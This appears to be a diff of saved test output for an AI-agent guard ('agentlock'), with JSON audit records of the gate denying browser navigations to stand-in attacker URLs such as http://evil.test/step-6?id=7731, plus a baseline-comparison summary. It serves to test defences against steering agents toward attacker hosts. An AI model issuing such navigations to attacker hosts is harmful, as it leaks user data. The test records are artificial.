+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-5aca5e5e", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-5?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf648b4f86fa6e", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-5?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "134536532ee355974ebcecacf39302b66861de6f296f42a302d238be288369c7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_db78c8cfb42845d44a41d197", "role": "operator", "signature": "fd407969d290dca737b0ebe71a57d0dca576cdaf728066cf25ee3ac358f0a3f2", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.5867639, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.58745, "value": "http://evil.test/step-5?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-db1b9903", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-6?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-6?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9771877e1a142d22d99a4e47a5219163c0f2e5a743a599793573ecf61e325a4", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_327ac7a9d9859b5d5a64aa99", "role": "operator", "signature": "d14b1833b5cd7dc7b20105c7ef324651b1d78a170d7c815fbf42ed257630e5f7", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.588695, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.5887268, "value": "http://evil.test/step-6?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-db1b9903", "cause": "tool", "channel": "MODEL", "confirmation": "cap_reached", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-6?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-6?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9771877e1a142d22d99a4e47a5219163c0f2e5a743a599793573ecf61e325a4", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_327ac7a9d9859b5d5a64aa99", "role": "operator", "signature": "d14b1833b5cd7dc7b20105c7ef324651b1d78a170d7c815fbf42ed257630e5f7", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.588695, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.5888245, "value": "http://evil.test/step-6?id=7731"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -1598,5 +1453,5 @@ MATCH: yes
 ========================================================================
 SUMMARY
 ========================================================================
-matching the freeze: ['EL1', 'EL2', 'EL3', 'EL4', 'EL5', 'EL6', 'EL7', 'EL7off', 'EL8', 'EL8b', 'EL8c', 'EL9', 'EL10']
+matching the freeze: ['EL1', 'EL2', 'EL3', 'EL4', 'EL5', 'EL6', 'EL7', 'EL7off', 'EL8', 'EL8b', 'EL8c', 'EL10']
 differing from the freeze: []
